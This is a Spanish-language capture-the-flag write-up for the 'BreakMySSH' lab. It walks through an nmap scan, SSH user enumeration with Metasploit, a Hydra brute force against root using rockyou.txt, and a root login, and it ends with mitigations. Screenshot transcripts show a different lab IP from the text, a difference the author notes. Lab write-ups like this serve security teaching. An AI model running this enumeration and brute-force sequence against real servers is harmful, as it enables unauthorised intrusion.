# BreakMySSH — SSH enumeration y acceso root 🔓🐧

## Resumen ejecutivo 🏁
- Objetivo: Enumerar y comprometer el servicio SSH en 172.17.0.3
- Servicio principal: SSH (OpenSSH 7.7)
- Resultado: Se enumeró un usuario válido (`root`) con Metasploit, se recuperó la contraseña (`estrella`) con Hydra y se obtuvo acceso SSH como root.

---

## 1) Escaneo de puertos 🧭
Comando usado:

```bash
nmap -p- --open -sS -sV --min-rate 2000 -n -Pn 172.17.0.3
```

Resultado relevante:

- 22/tcp open  ssh  OpenSSH 7.7 (protocol 2.0)

---

## 2) Enumeración de usuarios (Metasploit) 🔎
Se usó el módulo auxiliar de Metasploit para enumerar usuarios SSH:

- Módulo: `auxiliary/scanner/ssh/ssh_enumusers`
- Uso en msfconsole:

```text
msf > use auxiliary/scanner/ssh/ssh_enumusers
msf auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 172.17.0.3
msf auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /ruta/a/rockyou.txt   # opcional
msf auxiliary(scanner/ssh/ssh_enumusers) > run
```

> Nota importante: Las capturas de pantalla proporcionadas muestran salidas con la IP `172.17.0.2`. A continuación transcribo el texto exacto de cada imagen para evitar confusiones — las transcripciones se muestran como texto literal y están claramente separadas del resto del writeup.

---

## Transcripciones de las capturas (texto literal)

### Captura 1 — Transcripción (ssh_enumusers, ejemplo)

```
msf auxiliary(scanner/ssh/ssh_enumusers) > run
[*] 172.17.0.2:22 - SSH - Using malformed packet technique
[*] 172.17.0.2:22 - SSH - Checking for false positives
[*] 172.17.0.2:22 - SSH - Starting scan
[+] 172.17.0.2:22 - SSH - User '_apt' found
[+] 172.17.0.2:22 - SSH - User 'backup' found
[+] 172.17.0.2:22 - SSH - User 'bin' found
[+] 172.17.0.2:22 - SSH - User 'daemon' found
[+] 172.17.0.2:22 - SSH - User 'games' found
[+] 172.17.0.2:22 - SSH - User 'gnats' found
[+] 172.17.0.2:22 - SSH - User 'irc' found
[+] 172.17.0.2:22 - SSH - User 'list' found
[+] 172.17.0.2:22 - SSH - User 'lp' found
[+] 172.17.0.2:22 - SSH - User 'mail' found
[+] 172.17.0.2:22 - SSH - User 'man' found
[+] 172.17.0.2:22 - SSH - User 'news' found
[+] 172.17.0.2:22 - SSH - User 'nobody' found
[+] 172.17.0.2:22 - SSH - User 'proxy' found
[+] 172.17.0.2:22 - SSH - User 'root' found
[+] 172.17.0.2:22 - SSH - User 'sync' found
[+] 172.17.0.2:22 - SSH - User 'sys' found
[+] 172.17.0.2:22 - SSH - User 'uucp' found
[+] 172.17.0.2:22 - SSH - User 'www-data' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/ssh/ssh_enumusers) >
```

---

### Captura 2 — Transcripción (duplicado/otro momento)

```
msf auxiliary(scanner/ssh/ssh_enumusers) > run
[*] 172.17.0.2:22 - SSH - Using malformed packet technique
[*] 172.17.0.2:22 - SSH - Checking for false positives
[*] 172.17.0.2:22 - SSH - Starting scan
[+] 172.17.0.2:22 - SSH - User '_apt' found
[+] 172.17.0.2:22 - SSH - User 'backup' found
[+] 172.17.0.2:22 - SSH - User 'bin' found
[+] 172.17.0.2:22 - SSH - User 'daemon' found
[+] 172.17.0.2:22 - SSH - User 'games' found
[+] 172.17.0.2:22 - SSH - User 'gnats' found
[+] 172.17.0.2:22 - SSH - User 'irc' found
[+] 172.17.0.2:22 - SSH - User 'list' found
[+] 172.17.0.2:22 - SSH - User 'lp' found
[+] 172.17.0.2:22 - SSH - User 'mail' found
[+] 172.17.0.2:22 - SSH - User 'man' found
[+] 172.17.0.2:22 - SSH - User 'news' found
[+] 172.17.0.2:22 - SSH - User 'nobody' found
[+] 172.17.0.2:22 - SSH - User 'proxy' found
[+] 172.17.0.2:22 - SSH - User 'root' found
[+] 172.17.0.2:22 - SSH - User 'sync' found
[+] 172.17.0.2:22 - SSH - User 'sys' found
[+] 172.17.0.2:22 - SSH - User 'uucp' found
[+] 172.17.0.2:22 - SSH - User 'www-data' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/ssh/ssh_enumusers) >
```

---

### Captura 3 — Transcripción (Hydra)

```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (1:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: root   password: estrella
1 of 1 target successfully completed, 1 valid password found
```

---

### Captura 4 — Transcripción (sesión SSH como root)

```
ssh root@172.17.0.2
# password: estrella
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pgp.html
root@172.17.0.2's password:
Last login: Sat Jul  4 15:56:32 2026 from 172.17.0.1
The programs included with the Debian GNU/Linux system are free software;
... (banner omitted)
root@79cb2b6fc8fb:~# id
uid=0(root) gid=0(root) groups=0(root)
root@79cb2b6fc8fb:~#
```

> Nota: He mantenido las líneas literales tal como aparecen en las capturas y he acortado el banner de sistema con "... (banner omitted)" para que la transcripción sea legible; si prefieres la transcripción completa del banner, lo incluyo.

---

## 3) Fuerza bruta con Hydra ⚔️
Con el usuario `root` identificado, se ejecutó Hydra contra SSH usando un wordlist (p. ej. `rockyou.txt`):

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.3 -t 4
```

Resultado (en el entorno de trabajo):

- host: `172.17.0.3`  login: `root`  password: `estrella`

---

## 4) Acceso SSH 🛠️
Se inició sesión SSH con las credenciales encontradas:

```bash
ssh root@172.17.0.3
# password: estrella
```

Verificación de privilegios:

```text
root@<host>:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 5) Conclusión ✅
- La máquina BreakMySSH fue comprometida atacando únicamente el servicio SSH.
- Riesgo principal: enumeración de usuarios + contraseñas débiles → acceso root directo.

Mitigaciones recomendadas:
- Deshabilitar el login directo de `root` por SSH (`PermitRootLogin no`).
- Forzar autenticación por clave pública (deshabilitar uso de passwords).
- Aplicar políticas de contraseñas robustas y bloqueos ante intentos repetidos.
- Filtrar/limitar acceso SSH por IP/VPN.

---

## Notas legales y de uso ⚠️
Este ejercicio se realizó con fines educativos y en un entorno controlado. No ejecutes ataques contra sistemas sin autorización expresa del propietario.

---

## Archivos relacionados 📁
- Writeup: `laboratorios/BreakMySSH/breakmyssh.md`
- (Antes había imágenes; las capturas fueron transcritas arriba para evitar confusiones.)
